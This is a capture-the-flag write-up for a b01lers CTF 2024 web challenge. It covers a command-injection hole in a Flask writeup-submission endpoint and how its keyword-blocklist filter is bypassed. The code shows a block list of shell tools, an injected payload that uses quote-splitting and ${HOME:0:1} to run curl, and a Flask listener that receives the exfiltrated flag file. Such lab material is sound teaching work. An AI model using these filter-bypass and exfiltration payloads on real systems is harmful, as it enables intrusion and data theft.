---
title: "3-city-elves-writeups - b01lers CTF 2024"
category: "web"
subcategory: "rce"
type: "writeup"
tags: ["command-injection", "web", "file-upload", "flask", "nmap", "base64", "os-system", "rce", "b01lers-ctf", "b01lers-ctf-2024", "2024", "ctf-writeup"]
summary: "Command Injection challenge where we need to bypass a blacklisted words and leak a flag.png."
source:
  name: "CTFtime writeup #39102"
  url: "https://ctftime.org/writeup/39102"
original_source: "https://xeunwa.github.io/b01lers-2024/#web3-city-elves-writeups"
ctf:
  name: "b01lers CTF 2024"
  year: 2024
  challenge: "3-city-elves-writeups"
---

## Metadata

- **CTF:** b01lers CTF 2024
- **Task:** 3-city-elves-writeups
- **Author team:** 25ji
- **CTFtime tags:** command-injection, web
- **CTFtime:** <https://ctftime.org/writeup/39102>
- **Original writeup:** <https://xeunwa.github.io/b01lers-2024/#web3-city-elves-writeups>

---
# web/3-city-elves-writeups  
> I'm competing in a CTF so I don't have time to make my 3-city-elves challenge. How about you guys help me with the CTF I'm in by submitting some writeups? I would really appreciate it! I only need some kind of medical hardware hacking, like insulin pump hacking. Supply chain is also acceptable. Don't try to do anything silly, the writeup submission comes with a next-gen WAF. We need your help to beat Contraband Manchester United and Sigma Pony! `<https://instancer.b01lersc.tf/challenge/threecityelf>`

Command Injection challenge where we need to bypass a blacklisted words and leak a flag.png. To solve this I setup a file upload server after confirming i can do a curl command.

Main challenge  
```python  
@app.route("/pentest_submitted_flags", methods=["POST"])  
def submit():  
if request.is_json:  
# Retrieve JSON data  
data = request.json  
content = data["content"]  
if sus(content):  
return jsonify({"message": "The requested URL was rejected. Please consult with your administrator."}), 200  
else:  
filename = "writeup_" + secrets.token_urlsafe(50)  
os.system(f"bash -c \'echo \"{content}\" > {filename}\'")  
# Like I care about your writeup  
os.system(f"rm -f writeup_{filename}")  
return jsonify({"message": "Writeup submitted successfully"}), 200  
else:  
return jsonify({'error': 'Request data must be in JSON format'}), 400  
```  
[waf.py](http://waf.py)  
```python  
def sus(content):  
taboo = [  
"bin",  
"base64",  
"export",  
"python3",  
"export",  
"ruby",  
"perl",  
"x",  
"/",  
"(",  
")"  
"\\\",  
"rm",  
"mv",  
"chmod",  
"chown",  
"tar",  
"gzip",  
"bzip2",  
"zip",  
"find",  
"grep",  
"sed",  
"awk",  
"cat",  
"less",  
"more",  
"head",  
"tail",  
"echo",  
"printf",  
"read",  
"touch",  
"ln",  
"wget",  
"curl",  
"fetch",  
"scp",  
"rsync",  
"sudo",  
"ssh",  
"nc",  
"netcat",  
"ping",  
"traceroute",  
"iptables",  
"ufw",  
"firewalld",  
"crontab",  
"ps",  
"top",  
"htop",  
"du",  
"df",  
"free",  
"uptime",  
"kill",  
"killall",  
"nohup",  
"jobs",  
"bg",  
"fg",  
"watch",  
"wc",  
"sort",  
"uniq",  
"tee",  
"diff",  
"patch",  
"mount",  
"umount",  
"lsblk",  
"blkid",  
"fdisk",  
"parted",  
"mkfs",  
"fsck",  
"dd",  
"hdparm",  
"lsmod",  
"modprobe",  
"lsusb",  
"lspci",  
"ip",  
"ifconfig",  
"route",  
"netstat",  
"ss",  
"hostname",  
"dnsdomainname",  
"date",  
"cal",  
"who",  
"w",  
"last",  
"history",  
"alias",  
"export",  
"source",  
"umask",  
"pwd",  
"cd",  
"mkdir",  
"rmdir",  
"stat",  
"file",  
"chattr",  
"lsof",  
"ncdu",  
"dmesg",  
"journalctl",  
"logrotate",  
"systemctl",  
"service",  
"init",  
"reboot",  
"shutdown",  
"poweroff",  
"halt",  
"systemd",  
"update-alternatives",  
"adduser",  
"useradd",  
"userdel",  
"usermod",  
"groupadd",  
"groupdel",  
"groupmod",  
"passwd",  
"chpasswd",  
"userpasswd",  
"su",  
"visudo",  
"chsh",  
"chfn",  
"getent",  
"id",  
"whoami",  
"groups",  
"quota",  
"quotaon",  
"quotacheck",  
"scp",  
"sftp",  
"ftp",  
"tftp",  
"telnet",  
"ssh-keygen",  
"ssh-copy-id",  
"ssh-add",  
"ssh-agent",  
"nmap",  
"tcpdump",  
"iftop",  
"arp",  
"arping",  
"brctl",  
"ethtool",  
"iw",  
"iwconfig",  
"mtr",  
"tracepath",  
"fping",  
"hping3",  
"dig",  
"nslookup",  
"host",  
"whois",  
"ip",  
"route",  
"ifconfig",  
"ss",  
"iptables",  
"firewalld",  
"ufw",  
"sysctl",  
"uname",  
"hostnamectl",  
"timedatectl",  
"losetup",  
"eject",  
"lvm",  
"vgcreate",  
"vgextend",  
"vgreduce",  
"vgremove",  
"vgs",  
"pvcreate",  
"pvremove",  
"pvresize",  
"pvs",  
"lvcreate",  
"lvremove",  
"lvresize",  
"lvs",  
"resize2fs",  
"tune2fs",  
"badblocks",  
"udevadm",  
"pgrep",  
"pkill",  
"atop",  
"iotop",  
"vmstat",  
"sar",  
"mpstat",  
"nmon",  
"finger",  
"ac",  
"journalctl",  
"ls",  
"dir",  
"locate",  
"updatedb",  
"which",  
"whereis",  
"cut",  
"paste",  
"tr",  
"comm",  
"xargs",  
"gunzip",  
"bunzip2",  
"unzip",  
"xz",  
"unxz",  
"lzma",  
"unlzma",  
"7z",  
"ar",  
"cpio",  
"pax",  
"ftp",  
"sftp",  
"ftp",  
"wget",  
"curl",  
"fetch",  
"rsync",  
"scp",  
"ssh",  
"openssl",  
"gpg",  
"pgp",  
]  
for item in taboo:  
if item in content.lower():  
return True  
return False  
```

We can bypass most of the linux command words using this technique `c''url` and to bypass the `/` we can do `${HOME:0:1}`. https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions

The command I used does a POST request to my file upload server with the /flag.png attached in the body 

[solve.py](http://solve.py)   
```python  
import os  
import requests   
from waf import sus

# curl -F data=/flag.png <ip:port>  
payload = "cu''rl -F \"data=@${HOME:0:1}flag.png\" <redacted>"  
content = f"""123" ; {payload} ; e''cho "123"""  
assert not sus(content)  
filename = "test"  
command = f"bash -c \'echo \"{content}\" > {filename}\'"  
print(content)  
print(command)  
# os.system(command) 

url = "<https://threecityelf-53b6fe52e327b2cb.instancer.b01lersc.tf/pentest_submitted_flags>"

json = {  
'content': content  
}  
r = [requests.post](http://requests.post)(url, json=json)  
print(r.text)  
```

[server.py](http://server.py)   
```python  
from flask import Flask, request  
import os

app = Flask(__name__)

UPLOAD_FOLDER ='uploads'  
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER  
@app.route('/', methods=["POST"])  
def xfil():  
try:  
file = request.files['data']  
filename = file.filename  
file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))  
except Exception as e:  
return str(e)  
return 'Success'  
if __name__ == '__main__':  
app.run(host='0.0.0.0',port=8901)  
```

To view the flag, I just opened the uploaded file under `/uploads` on the listener server

![flag.png](<https://xeunwa.github.io/b01lers-2024/image-1.png>)

**flag**: bctf{Lucky_you_I_did_not_code_this_stuff_in_Ruby_lasudkjklhdsfkhjkae}
